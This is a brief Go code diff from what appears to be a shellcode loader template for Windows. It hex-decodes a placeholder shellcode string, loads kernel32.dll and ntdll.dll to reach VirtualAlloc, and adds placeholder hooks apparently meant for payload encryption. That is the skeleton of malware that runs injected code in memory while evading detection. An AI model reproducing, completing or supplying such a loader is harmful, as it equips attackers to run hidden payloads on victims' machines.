@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"golang.org/x/sys/windows"
 	"unsafe"
+	//__ENCRYPTMODULE__
 )
 
 const (
@@ -16,6 +17,7 @@ const (
 
 func main() {
 	shellcode, _ := hex.DecodeString("__SHELLCODE__")
+	//__ENCRYPTCODE__
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
